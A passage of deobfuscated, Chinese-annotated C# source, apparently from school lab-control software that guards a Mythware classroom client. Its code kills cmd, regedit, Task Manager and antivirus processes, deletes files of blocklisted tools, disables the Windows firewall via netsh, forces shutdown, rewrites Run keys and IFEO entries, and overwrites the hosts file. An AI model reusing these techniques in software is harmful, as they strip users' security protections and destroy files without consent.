				if (this.classroomGuardMode == 1)
				{
					checked
					{
						for (int i = 0; i <= Information.UBound(this.classroomProcessList, 1); i++)
						{
							string processName = Strings.Replace(this.classroomProcessList[i], ".exe", "", 1, -1, CompareMethod.Binary);
							if (!this.CheckProcessExists(processName))
							{
								TokenizerConfig.MyForms.Form2.shuoming.Text = "电子教室进程未找到或本地连接IP地址错误！请重新启动电脑。";
								TokenizerConfig.MyForms.Form2.Show();
								this.Timer2.Enabled = true;
							}
						}
					}
					return;
				}
				// 模式2：单进程守护（按状态分级处理）
				if (this.classroomGuardMode == 2)
				{
					checked
					{
						Form1.ProcessStatus status = this.CheckProcessStatus(this.classroomProcessName);
						switch (status)
						{
						case Form1.ProcessStatus.Running:
							this.classroomPausedCount = 0;
							if (this.classroomPausedWarningShown)
							{
								TokenizerConfig.MyForms.Form3.Close();
							}
							this.classroomPausedWarningShown = false;
							break;
						case Form1.ProcessStatus.Suspended:
						case Form1.ProcessStatus.NotResponding:
							this.classroomPausedCount++;
							break;
						case Form1.ProcessStatus.NotFound:
							this.classroomPausedWarningShown = true;
							this.classroomNotFoundCount++;
							// 进程文件被删除 → 从 .exe2 副本恢复
							if (!File.Exists(this.classroomProcessPath))
							{
								this.backupFilePath = this.classroomProcessPath + "2";
								File.Copy(this.backupFilePath, this.classroomProcessPath);
							}
							Process.Start(this.classroomProcessPath);
							break;
						}
						// 连续 5 次未找到 → 强制关机
						if (this.classroomNotFoundCount >= 5)
						{
							Form1.ForceShutdown();
							Process.Start("shutdown", "/s /f /t 0");
						}
						// 暂停计数 >10 → 锁屏；>8 → 警告
						if (this.classroomPausedCount > 10)
						{
							TokenizerConfig.MyForms.Form2.shuoming.Text = "电子教室程序被暂停！";
							TokenizerConfig.MyForms.Form2.Show();
							this.Timer2.Enabled = true;
						}
						else if (this.classroomPausedCount > 8)
						{
							this.classroomPausedWarningShown = true;
							TokenizerConfig.MyForms.Form3.shuoming.Text = "电子教室程序被暂停！";
							TokenizerConfig.MyForms.Form3.Show();
						}
					}
				}
			}
			catch (Exception ex)
			{
				// 原 VB On Error 样板：异常忽略，继续下一块
			}
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00003F6C File Offset: 0x0000216C
		/// <summary>
		/// Timer_wangluo.Tick·网络/IP 监控（原名 ResolveTemplate）。
		/// 流程：1. GetWiredNetworkIP() 取有线 IP；首次非空则记入 wiredNetworkIp；2. 无 IP（拔网线/禁网）→警告"你拔了网线或禁用了网络连接！请马上恢复网络，否则会全屏锁定！"，超 5 次→关 Form3、Form2 显示"请重新启动电脑！"+启用 Timer2 锁屏；3. IP 改变→警告"你修改了IP地址！原地址为:xxx"，同样超 5 次锁屏；4. 恢复后关闭警告窗。
		/// </summary>
		private void TimerWangluoTick_MonitorNetwork(object sender, EventArgs e)
		{
			// [反混淆] 原状态机 ~160 行 → 还原为正常 if/else 控制流（VB On Error 样板 → try-catch 忽略异常）
			try
			{
				string currentIp = this.GetWiredNetworkIP();
				// 首次记录基准 IP（跳过 APIPA 自动配置地址 169.254.*）
				if (string.IsNullOrEmpty(this.wiredNetworkIp) && !(string.IsNullOrEmpty(currentIp) || currentIp.StartsWith("169.254.")))
				{
					this.wiredNetworkIp = currentIp;
				}
				if (string.IsNullOrEmpty(currentIp))
				{
					// 无 IP：拔网线/禁网
					checked
					{
						this.networkViolationCount++;
					}
					if (this.networkViolationCount > 5)
					{
						// 超过 5 次 → 锁屏
						TokenizerConfig.MyForms.Form3.Close();
						TokenizerConfig.MyForms.Form2.shuoming.Text = "你拔了网线或禁用了网络连接！";
						TokenizerConfig.MyForms.Form2.shuoming2.Text = "请重新启动电脑！";
						TokenizerConfig.MyForms.Form2.Show();
						this.Timer2.Enabled = true;
					}
					else
					{
						this.networkDownWarningShown = true;
						TokenizerConfig.MyForms.Form3.shuoming.Text = "你拔了网线或禁用了网络连接！";
						TokenizerConfig.MyForms.Form3.shuoming2.Text = "请马上恢复网络，否则会全屏锁定！";
						TokenizerConfig.MyForms.Form3.Show();
					}
				}
				else if (currentIp != this.wiredNetworkIp & this.wiredNetworkIp != "")
				{
					// IP 被修改
					checked
					{
						this.networkViolationCount++;
					}
					if (this.networkViolationCount > 5)
					{
						// 超过 5 次 → 锁屏
						TokenizerConfig.MyForms.Form3.Close();
						TokenizerConfig.MyForms.Form2.shuoming.Text = "你修改了IP地址！原地址为:" + this.wiredNetworkIp;
						TokenizerConfig.MyForms.Form2.shuoming2.Text = "请重新启动电脑！";
						TokenizerConfig.MyForms.Form2.Show();
						this.Timer2.Enabled = true;
					}
					else
					{
						this.ipChangedWarningShown = true;
						TokenizerConfig.MyForms.Form3.shuoming.Text = "你修改了IP地址！原地址为:" + this.wiredNetworkIp;
						TokenizerConfig.MyForms.Form3.shuoming2.Text = "请马上恢复网络，否则会全屏锁定！";
						TokenizerConfig.MyForms.Form3.Show();
					}
				}
				else
				{
					// 网络恢复正常 → 关闭警告窗
					if (this.ipChangedWarningShown | this.networkDownWarningShown)
					{
						TokenizerConfig.MyForms.Form3.Close();
					}
					this.ipChangedWarningShown = false;
					this.networkDownWarningShown = false;
				}
			}
			catch (Exception ex)
			{
				// 原 VB On Error 样板：异常忽略，继续下一块
			}
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00004364 File Offset: 0x00002564
		/// <summary>
		/// WMI 进程创建事件·违规进程查杀（原名 FillTemplate，挂接 wmiProcessWatcher.EventArrived）。
		/// 流程：1. 从 e.NewEvent["TargetInstance"] 取 ProcessId/Name 存入 currentProcessName，Process.GetProcessById 取主模块路径与 FileVersionInfo（ProductName+FileDescription 拼接）；2. shaduCheckRegistryValue=="off" 时进程黑名单从索引 11 扫起，否则从 1；cmdCheckRegistryValue=="off" 时产品黑名单从 4 扫起，否则从 1；3. 进程名 InStr 匹配 processNameBlacklist→processMatchIndex；产品描述匹配 productDescriptionBlacklist→productMatchIndex；4. 进程命中分级：≤10（杀软/备用）→仅弹 Form2 警告；11~16（进程/任务管理/虚拟桌面/扫雷/纸牌）→Kill+Form3 警告；17~21（解压软件）→gaoweiHighRiskFlag!=1 时 Kill+警告；>21（对抗工具+服务端下发）→Kill+警告+删文件；5. 产品命中分级：≤6（cmd/regedit/mmc/任务管理器）→Sleep 2s+Kill（5/6 先警告）；>50→Kill+警告+删文件；==43(GameBar)→只 Kill 不警告；其余→Kill+警告。
		/// </summary>
		private void WmiProcessCreated_CheckViolation(object sender, EventArrivedEventArgs e)
		{
			// [反混淆] 原 goto 标签结构（IL_11C/IL_18B）→ 还原为两个顺序扫描循环 + 分级处理
			ManagementBaseObject targetInstance = (ManagementBaseObject)e.NewEvent["TargetInstance"];
			int processId = Conversions.ToInteger(targetInstance["ProcessId"]);
			this.currentProcessName = targetInstance["Name"].ToString();
			Process process = Process.GetProcessById(processId);
			string mainModulePath = process.MainModule.FileName;
			bool processMatched = false;
			bool productMatched = false;
			checked
			{
				if (!string.IsNullOrEmpty(mainModulePath))
				{
					FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(mainModulePath);
					string productInfo = versionInfo.ProductName + versionInfo.FileDescription;
					// 1. 进程名黑名单扫描（shadu_jianche=="off" 时从索引 11 扫起，跳过杀软段）
					this.processMatchIndex = (this.shaduCheckRegistryValue == "off") ? 11 : 1;
					while (Operators.CompareString(this.processNameBlacklist[this.processMatchIndex], "", false) != 0)
					{
						string rule = this.processNameBlacklist[this.processMatchIndex];
						if (Strings.InStr("|" + Strings.UCase(this.currentProcessName), Strings.UCase(rule), CompareMethod.Binary) != 0)
						{
							processMatched = true;
							break;
						}
						this.processMatchIndex++;
					}
					// 2. 产品描述黑名单扫描（cmd_jianche=="off" 时从索引 4 扫起，跳过 cmd 段）
					this.productMatchIndex = (this.cmdCheckRegistryValue == "off") ? 4 : 1;
					while (Operators.CompareString(this.productDescriptionBlacklist[this.productMatchIndex], "", false) != 0)
					{
						string rule2 = this.productDescriptionBlacklist[this.productMatchIndex];
						if (Strings.InStr(productInfo, rule2, CompareMethod.Binary) != 0)
						{
							productMatched = true;
							break;
						}
						this.productMatchIndex++;
					}
					// 3. 进程名命中分级
					if (processMatched)
					{
						if (this.processMatchIndex <= 10)
						{
							// 杀软/备用 → 仅弹 Form2 警告
							this.BeginInvoke(new MethodInvoker(this.ShowAntivirusWarning));
						}
						else if (this.processMatchIndex <= 16)
						{
							// 进程/任务管理/虚拟桌面/扫雷/纸牌 → 杀进程 + Form3 警告
							process.Kill();
							this.BeginInvoke(new MethodInvoker(this.ShowViolationWarning));
						}
						else if (this.processMatchIndex <= 21)
						{
							// 解压软件 → 高危开关非 1 时杀进程 + 警告
							if (this.gaoweiHighRiskFlag != 1)
							{
								process.Kill();
								this.BeginInvoke(new MethodInvoker(this.ShowViolationWarning));
							}
						}
						else
						{
							// 对抗工具/服务端下发 → 杀进程 + 警告 + 删除文件
							process.Kill();
							this.BeginInvoke(new MethodInvoker(this.ShowViolationWarning));
							process.WaitForExit(1000);
							FileSystem.Kill(mainModulePath);
						}
					}
					// 4. 产品描述命中分级
					if (!productMatched)
					{
						return;
					}
					if (this.productMatchIndex <= 3)
					{
						// cmd/PowerShell → 延迟 2s 后杀
						Thread.Sleep(2000);
						process.Kill();
						return;
					}
					if (this.productMatchIndex == 4)
					{
						// regedit → 延迟 2s 后杀
						Thread.Sleep(2000);
						process.Kill();
						return;
					}
					if (this.productMatchIndex == 5)
					{
						// mmc → 先警告再延迟杀
						this.BeginInvoke(new MethodInvoker(this.ShowViolationWarning));
						Thread.Sleep(2000);
						process.Kill();
						return;
					}
					if (this.productMatchIndex == 6)
					{
						// 任务管理器 → 先警告再延迟杀
						this.BeginInvoke(new MethodInvoker(this.ShowViolationWarning));
						Thread.Sleep(2000);
						process.Kill();
						return;
					}
					if (this.productMatchIndex > 50)
					{
						// 服务端下发产品名/对抗工具 → 杀进程 + 警告 + 删除文件
						process.Kill();
						this.BeginInvoke(new MethodInvoker(this.ShowViolationWarning));
						process.WaitForExit(1000);
						FileSystem.Kill(mainModulePath);
						return;
					}
					// 其余命中 → 杀进程（GameBar 索引 43 静默不弹警告）
					process.Kill();
					if (this.productMatchIndex != 43)
					{
						this.BeginInvoke(new MethodInvoker(this.ShowViolationWarning));
					}
				}
			}
		}

		// Token: 0x0600005D RID: 93 RVA: 0x000046B0 File Offset: 0x000028B0
		/// <summary>
		/// Timer_fhq.Tick·防火墙关闭（原名 RegisterTemplate）。
		/// 流程：读 StandardProfile/PublicProfile 的 EnableFirewall，任一为"1"→计数+1；≤5 次：DisableCMD=0、netsh advfirewall set allprofiles state off、两处 EnableFirewall 写 0、Form3 警告"现在助手强制关闭防火墙！"；>5 次→Form2 锁屏"请重新启动电脑！"；恢复后关闭警告窗。
		/// </summary>
		private void TimerFhqTick_DisableFirewall(object sender, EventArgs e)
		{
			// [反混淆] 原状态机 ~120 行 → 还原为正常 if/else 控制流（VB On Error 样板 → try-catch 忽略异常）
			try
			{
				// 读标准/公共配置文件防火墙开关
				object standardProfileEnabled = RuntimeHelpers.GetObjectValue(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", "EnableFirewall", ""));
				object publicProfileEnabled = RuntimeHelpers.GetObjectValue(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile", "EnableFirewall", ""));
				// 任一配置开启（值为 "1"）→ 视为防火墙被启用
				if (Operators.CompareObjectEqual(standardProfileEnabled, "1", false) || Operators.CompareObjectEqual(publicProfileEnabled, "1", false))
				{
					checked
					{
						this.firewallViolationCount++;
					}
					if (this.firewallViolationCount > 5)
					{
						// 超过 5 次 → 锁屏
						TokenizerConfig.MyForms.Form3.Close();
						TokenizerConfig.MyForms.Form2.shuoming.Text = "你启用了防火墙，危害电子教室的运行！";
						TokenizerConfig.MyForms.Form2.shuoming2.Text = "请重新启动电脑！";
						TokenizerConfig.MyForms.Form2.Show();
						this.Timer2.Enabled = true;
					}
					else
					{
						// 强制关闭防火墙并警告
						ModelVisitor.WriteRegistryValue(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", 0, RegistryValueKind.DWord);
						Interaction.Shell("netsh advfirewall set allprofiles state off", AppWinStyle.Hide, true, -1);
						ModelVisitor.WriteRegistryValue(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", "EnableFirewall", 0, RegistryValueKind.DWord);
						ModelVisitor.WriteRegistryValue(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile", "EnableFirewall", 0, RegistryValueKind.DWord);
						this.firewallWarningShown = true;
						TokenizerConfig.MyForms.Form3.shuoming.Text = "你启用了防火墙，危害电子教室的运行！";
						TokenizerConfig.MyForms.Form3.shuoming2.Text = "现在助手强制关闭防火墙！";
						TokenizerConfig.MyForms.Form3.Show();
					}
				}
				else
				{
					// 防火墙已关闭 → 关闭警告窗
					if (this.firewallWarningShown)
					{
						TokenizerConfig.MyForms.Form3.Close();
					}
					this.firewallWarningShown = false;
				}
			}
			catch (Exception ex)
			{
				// 原 VB On Error 样板：异常忽略，继续下一块
			}
		}

		// Token: 0x0600005E RID: 94 RVA: 0x000049C8 File Offset: 0x00002BC8
		/// <summary>
		/// Timer_qdx.Tick·注册表保护（原名 DeleteTemplate）。
		/// 流程：1. 读 HKCU\Software\n（主密码），与内存 masterPasswordHash 不同→计数+1、写回原密码、Form3 警告"你修改了助手的密码！现在强制恢复密码！"，>25 次锁屏；2. 读 HKLM RUN 键 prozs/jfglzsn（含 WOW6432Node 回退），与 runKeyProzsValue/runKeyJfglzsnValue 不符→重写为 启动目录\przs.exe / jfglzsn.exe。
		/// 关键 API：Registry、ModelVisitor.WriteRegistryValue。
		/// </summary>
		private void TimerQdxTick_ProtectRegistry(object sender, EventArgs e)
		{
			// [反混淆] 原状态机 ~130 行 → 还原为正常 if/else 控制流（VB On Error 样板 → try-catch 忽略异常）
			try
			{
				checked
				{
					// 原混淆残留：计算指针位数，结果未使用（保留以保持等价）
					int pointerBitness = Marshal.SizeOf(IntPtr.Zero) * 8;
					// 1. 主密码保护：HKCU\Software\n 被改 → 立即写回并警告
					object currentPassword = RuntimeHelpers.GetObjectValue(ModelVisitor.ReadRegistryValue(Registry.CurrentUser, "Software", "n", ""));
					if (Operators.ConditionalCompareObjectNotEqual(currentPassword, this.masterPasswordHash, false))
					{
						this.passwordViolationCount++;
						ModelVisitor.WriteRegistryValue(Registry.CurrentUser, "Software", "n", this.masterPasswordHash, RegistryValueKind.String);
						TokenizerConfig.MyForms.Form3.shuoming.Text = "你修改了助手的密码！";
						TokenizerConfig.MyForms.Form3.shuoming2.Text = "现在强制恢复密码！";
						TokenizerConfig.MyForms.Form3.Show();
						this.passwordWarningShown = true;
						// 超过 25 次 → 锁屏
						if (this.passwordViolationCount > 25)
						{
							TokenizerConfig.MyForms.Form3.Close();
							TokenizerConfig.MyForms.Form2.shuoming.Text = "你修改了助手的密码！";
							TokenizerConfig.MyForms.Form2.shuoming2.Text = "请重新启动电脑！";
							TokenizerConfig.MyForms.Form2.Show();
							this.Timer2.Enabled = true;
						}
					}
					else
					{
						// 密码未被修改 → 关闭警告窗
						if (this.passwordWarningShown)
						{
							TokenizerConfig.MyForms.Form3.Close();
						}
						this.passwordWarningShown = false;
					}
					// 2. 自启动项保护：RUN\prozs / RUN\jfglzsn 被改 → 写回启动目录路径
					object runProzs = RuntimeHelpers.GetObjectValue(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "prozs", ""));
					if (Operators.ConditionalCompareObjectEqual(runProzs, "", false))
					{
						runProzs = RuntimeHelpers.GetObjectValue(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SOFTWARE\\WOW6432NODE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "prozs", ""));
					}
					object runJfglzsn = RuntimeHelpers.GetObjectValue(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "jfglzsn", ""));
					if (Operators.ConditionalCompareObjectEqual(runJfglzsn, "", false))
					{
						runJfglzsn = RuntimeHelpers.GetObjectValue(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SOFTWARE\\WOW6432NODE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "jfglzsn", ""));
					}
					if (Operators.CompareObjectNotEqual(runProzs, this.runKeyProzsValue, false) || Operators.CompareObjectNotEqual(runJfglzsn, this.runKeyJfglzsnValue, false))
					{
						ModelVisitor.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "prozs", Application.StartupPath + "\\przs.exe", RegistryValueKind.String);
						ModelVisitor.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "jfglzsn", Application.StartupPath + "\\jfglzsn.exe", RegistryValueKind.String);
					}
				}
			}
			catch (Exception ex)
			{
				// 原 VB On Error 样板：异常忽略，继续下一块
			}
		}

		// Token: 0x0600005F RID: 95 RVA: 0x00004DA8 File Offset: 0x00002FA8
		/// <summary>
		/// Timer_jiyu.Tick·极域配置与服务监控（原名 InvokeTemplate）。
		/// 流程：1. 按 jiyuRegistryBitness（1=64 位 Wow6432Node 路径，2=32 位路径）读 TopDomain\e-Learning Class\Student 的 ChannelId/AutoLogin；2. 与 jiyuChannelId/jiyuAutoLogin 基线不同→计数+1、Form3 警告"你修改了极域电子教室的参数！请马上恢复，否则会锁屏！"，>5 次锁屏；3. jiyuServiceMonitorEnabled 时：tencentFileFilterService/tencentNetFilterService.Refresh()——服务不存在→警告"2个重要服务不存在！"；非 Running→Start() 拉起并警告"2个重要服务停止！"，>5 次锁屏。
		/// </summary>
		private void TimerJiyuTick_MonitorJiyu(object sender, EventArgs e)
		{
			// [反混淆] 原状态机 ~190 行 → 还原为正常 if/else 控制流（VB On Error 样板 → try-catch 忽略异常）
			try
			{
				int channelId = 0;
				int autoLogin = 0;
				// 1. 按位数标志读极域客户端注册表参数（1=64 位 Wow6432Node 路径，2=32 位路径）
				if (this.jiyuRegistryBitness == 1)
				{
					channelId = Conversions.ToInteger(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SOFTWARE\\Wow6432Node\\TopDomain\\e-Learning Class\\Student", "ChannelId", ""));
					autoLogin = Conversions.ToInteger(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SOFTWARE\\Wow6432Node\\TopDomain\\e-Learning Class\\Student", "AutoLogin", ""));
				}
				else if (this.jiyuRegistryBitness == 2)
				{
					channelId = Conversions.ToInteger(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SOFTWARE\\TopDomain\\e-Learning Class\\Student", "ChannelId", ""));
					autoLogin = Conversions.ToInteger(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SOFTWARE\\TopDomain\\e-Learning Class\\Student", "AutoLogin", ""));
				}
				// 2. 参数被修改 → 警告
				if (channelId != this.jiyuChannelId | autoLogin != this.jiyuAutoLogin)
				{
					checked
					{
						this.jiyuParamViolationCount++;
					}
					TokenizerConfig.MyForms.Form3.shuoming.Text = "你修改了极域电子教室的参数！";
					TokenizerConfig.MyForms.Form3.shuoming2.Text = "请马上恢复，否则会锁屏！";
					TokenizerConfig.MyForms.Form3.Show();
					this.jiyuParamWarningShown = true;
				}
				else
				{
					// 参数正常 → 关闭警告窗
					if (this.jiyuParamWarningShown)
					{
						TokenizerConfig.MyForms.Form3.Close();
					}
					this.jiyuParamWarningShown = false;
				}
				// 参数违规超过 5 次 → 锁屏
				if (this.jiyuParamViolationCount > 5)
				{
					TokenizerConfig.MyForms.Form3.Close();
					TokenizerConfig.MyForms.Form2.shuoming.Text = "你修改了极域电子教室的参数！";
					TokenizerConfig.MyForms.Form2.Show();
					this.Timer2.Enabled = true;
				}
				// 3. 服务监控：tdfilefilter / tdnetfilter
				if (this.jiyuServiceMonitorEnabled)
				{
					this.tencentFileFilterService.Refresh();
					this.tencentNetFilterService.Refresh();
					if (this.tencentFileFilterService.Status == (ServiceControllerStatus)0 | this.tencentNetFilterService.Status == (ServiceControllerStatus)0)
					{
						// 服务不存在
						this.jiyuServiceViolationCount++;
						TokenizerConfig.MyForms.Form3.shuoming.Text = "极域电子教室的2个重要服务不存在！";
						TokenizerConfig.MyForms.Form3.Show();
						this.jiyuServiceWarningShown = true;
					}
					else if (this.tencentFileFilterService.Status == ServiceControllerStatus.Running & this.tencentNetFilterService.Status == ServiceControllerStatus.Running)
					{
						// 服务正常 → 关闭警告窗
						if (this.jiyuServiceWarningShown)
						{
							TokenizerConfig.MyForms.Form3.Close();
						}
						this.jiyuServiceWarningShown = false;
					}
					else
					{
						// 服务停止 → 强制拉起并警告
						this.tencentFileFilterService.Start();
						this.tencentNetFilterService.Start();
						this.jiyuServiceViolationCount++;
						TokenizerConfig.MyForms.Form3.shuoming.Text = "极域电子教室的2个重要服务停止！";
						TokenizerConfig.MyForms.Form3.Show();
						this.jiyuServiceWarningShown = true;
					}
					// 服务异常超过 5 次 → 锁屏
					if (this.jiyuServiceViolationCount > 5)
					{
						TokenizerConfig.MyForms.Form3.Close();
						TokenizerConfig.MyForms.Form2.shuoming.Text = "极域电子教室的2个重要服务停止！";
						TokenizerConfig.MyForms.Form2.Show();
						this.Timer2.Enabled = true;
					}
				}
			}
			catch (Exception ex)
			{
				// 原 VB On Error 样板：异常忽略，继续下一块
			}
		}

		// Token: 0x06000060 RID: 96 RVA: 0x000052CC File Offset: 0x000034CC
		/// <summary>
		/// Timer_updatehosts.Tick·hosts 更新（原名 AwakeTemplate）。
		/// 流程：重新下载 http://<serverHostname>/hmd_net.txt 写 hosts；hostsAdopted==true 时备份 hosts→hosts2 并停止本定时器；计数 >3 次后把 Interval 改为 60000（降频）。
		/// </summary>
		private void TimerUpdateHostsTick_UpdateHosts(object sender, EventArgs e)
		{
			this.UpdateHostsBlacklistAndRouteBlock("http://" + this.serverHostname + "/hmd_net.txt", "on");
			if (this.hostsAdopted)
			{
				File.SetAttributes(this.hostsFilePath + "2", FileAttributes.Normal);
				File.Copy(this.hostsFilePath, this.hostsFilePath + "2", true);
				this.Timer_updatehosts.Enabled = false;
			}
			checked
			{
				this.updateHostsTickCounter += 1L;
				if (this.updateHostsTickCounter > 3L)
				{
					this.Timer_updatehosts.Interval = 60000;
				}
			}
		}

		// Token: 0x06000061 RID: 97 RVA: 0x0000537C File Offset: 0x0000357C
		/// <summary>
		/// Timer_route.Tick·IFEO 保护（原名 CompareTemplate）。
		/// 流程：检查 HKLM\...\Image File Execution Options\route.exe\Debugger 是否被改成非"null"；被改→计数+1，≤5 次：重新下载黑名单恢复（UpdateHostsBlacklistAndRouteBlock(...,"on")）+Form3 警告"你修改了小助手r设置！现在助手强制恢复！"；>5 次→Form2 锁屏。
		/// </summary>
		private void TimerRouteTick_ProtectIfeo(object sender, EventArgs e)
		{
			string left = Conversions.ToString(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\route.exe", "Debugger", ""));
			checked
			{
				if (Operators.CompareString(left, "null", false) != 0)
				{
					this.routeIfeoViolationCount++;
					if (this.routeIfeoViolationCount <= 5)
					{
						this.UpdateHostsBlacklistAndRouteBlock("http://" + this.serverHostname + "/hmd_net.txt", "on");
						this.ifeoWarningShown = true;
						TokenizerConfig.MyForms.Form3.shuoming.Text = "你修改了小助手r设置！";
						TokenizerConfig.MyForms.Form3.shuoming2.Text = "现在助手强制恢复！";
						TokenizerConfig.MyForms.Form3.Show();
					}
					else
					{
						TokenizerConfig.MyForms.Form3.Close();
						TokenizerConfig.MyForms.Form2.shuoming.Text = "你修改了小助手r设置！";
						TokenizerConfig.MyForms.Form2.shuoming2.Text = "请重新启动电脑！";
						TokenizerConfig.MyForms.Form2.Show();
						this.Timer2.Enabled = true;
					}
				}
				else
				{
					if (this.ifeoWarningShown)
					{
						TokenizerConfig.MyForms.Form3.Close();
					}
					this.ifeoWarningShown = false;
				}
			}
		}

		// Token: 0x06000062 RID: 98 RVA: 0x000054B8 File Offset: 0x000036B8
		/// <summary>
		/// Form1.Load·初始化（原名 LogoutTemplate）。
		/// 流程：1. Hide() 隐藏主窗体；2. 以 当月×当日 为种子生成随机 5 位进程名（字符范围 i~r）存入 ModelVisitor.randomProcessName/randomProcessNameExe，并算 unusedInstallPath="C:\Program Files (x86)\"+名字第2~5位（未使用）；3. 读 HKCU\Software\jfglzs 下 dzjs（电子教室列表）、usb_jianche、shadu_jianche、cmd_jianche、zhuye；4. 解析 dzjs：other/空→模式0；含\绝对路径→模式2；否则→模式1；存 classroomProcessPath/classroomProcessName；5. 填充进程黑名单 processNameBlacklist[1..28]（杀软 360safe/HipsTray/QQPCTray/360taskmgr/QQPCNetFlow/360netman/iu杀毒、关键字 进程/任务管理/虚拟桌面、游戏/压缩软件、对抗工具 掌控课堂/夕颜若雪工具箱/极域/课堂狂欢器/电子教室/吾爱破解/NoTopDomain）；6. 填充产品黑名单 productDescriptionBlacklist[1..78]（cmd/PowerShell/regedit/mmc/任务管理器、进程工具 PC Hunter/IceSword/火绒剑/OpenArk 等、极域对抗工具 极域杀手/翘课/FuckMythware 等），productBlacklistCount=78；7. 击杀 taskmgr；8. 启动 WMI 监视（__InstanceCreationEvent + Win32_Process，处理器 WmiProcessCreated_CheckViolation）；9. 读极域注册表 ChannelId/AutoLogin：64 位路径非零→jiyuRegistryBitness=1 并启用 Timer_jiyu；否则 32 位路径→=2；10. 自检 tdfilefilter/tdnetfilter 服务：不存在→jiyuServiceMonitorEnabled=false；Stopped→Start()；Running→true；11. 读主密码 HKCU\Software\n、RUN 键 prozs/jfglzsn、gaowei（高危开关，默认 2）。
		/// 关键 API：Registry、ManagementEventWatcher、ServiceController、Process.Kill、Strings.Chr/Rnd（VB 随机）。
		/// </summary>
		private void Form1_Load(object sender, EventArgs e)
		{
			// [反混淆] 原状态机 ~430 行 → 还原为顺序执行 + if/else + for（VB On Error 样板 → try-catch 忽略异常）
			try
			{
				this.Hide();
				checked
				{
					// ---- 随机进程名生成 ----
					int seed = DateAndTime.Month(DateAndTime.Now) * DateAndTime.Day(DateAndTime.Now);
					int remainder7 = seed % 7;
					int remainder9 = seed % 9;
					int remainder5 = seed % 5;
					int remainder3 = seed % 3;
					// 第一段随机名：随后被 finalRandomName 覆盖（VB 原始代码如此，保留以保持等价）
					string firstRandomName;
					if (seed % 2 == 0)
					{
						firstRandomName = Conversions.ToString(Strings.Chr(97 + remainder7)) + Conversions.ToString(Strings.Chr(98 + remainder9)) + Conversions.ToString(Strings.Chr(101 + remainder5)) + Conversions.ToString(Strings.Chr(99 + remainder3));
					}
					else
					{
						firstRandomName = Conversions.ToString(Strings.Chr(97 + remainder9)) + Conversions.ToString(Strings.Chr(98 + remainder7)) + Conversions.ToString(Strings.Chr(101 + remainder3)) + Conversions.ToString(Strings.Chr(99 + remainder5));
					}
					ModelVisitor.randomProcessName = firstRandomName;
					ModelVisitor.randomProcessNameExe = firstRandomName + ".exe";
					// 第二段随机名（实际使用）：VBMath.Rnd 生成 5 位数字 → 每位数 +105 转字符 i~r
					VBMath.Randomize((double)seed);
					long randomValue = (long)Math.Round(unchecked((double)VBMath.Rnd() * 100000.0 * 3.0 + 1.0));
					string finalRandomName = "";
					for (int digitIndex = 1; digitIndex <= 5; digitIndex++)
					{
						long charCode = randomValue % 10L + 105L;
						finalRandomName = Conversions.ToString(Strings.Chr((int)charCode)) + finalRandomName;
						randomValue /= 10L;
					}
					ModelVisitor.randomProcessName = finalRandomName;
					ModelVisitor.randomProcessNameExe = finalRandomName + ".exe";
					this.unusedInstallPath = "C:\\Program Files (x86)\\" + Strings.Mid(finalRandomName, 2, 4);
					// ---- 读取配置 ----
					this.dzjsRegistryValue = Conversions.ToString(ModelVisitor.ReadRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "dzjs", ""));
					this.usbCheckRegistryValue = Conversions.ToString(ModelVisitor.ReadRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "usb_jianche", ""));
					this.shaduCheckRegistryValue = Conversions.ToString(ModelVisitor.ReadRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "shadu_jianche", ""));
					this.cmdCheckRegistryValue = Conversions.ToString(ModelVisitor.ReadRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "cmd_jianche", ""));
					// ---- 电子教室守护配置解析 ----
					this.classroomProcessList = Strings.Split(this.dzjsRegistryValue, ",", -1, CompareMethod.Binary);
					if (this.classroomProcessList[0] == "other" || this.classroomProcessList[0] == "")
					{
						this.classroomGuardMode = 0;   // 无守护
					}
					else if (Strings.InStr(this.classroomProcessList[0], "\\", CompareMethod.Binary) != 0)
					{
						this.classroomGuardMode = 2;   // 路径型
					}
					else
					{
						this.classroomGuardMode = 1;   // 进程名型
					}
					this.classroomProcessPath = this.classroomProcessList[0];
					this.classroomProcessName = Strings.Replace(Path.GetFileName(this.classroomProcessPath), ".exe", "", 1, -1, CompareMethod.Binary);
					// ---- 进程名黑名单（索引 1~28）----
					this.processNameBlacklist[1] = "|备用";
					this.processNameBlacklist[2] = "|备用";
					this.processNameBlacklist[3] = "|备用";
					this.processNameBlacklist[4] = "|360safe.exe";
					this.processNameBlacklist[5] = "|HipsTray.exe";
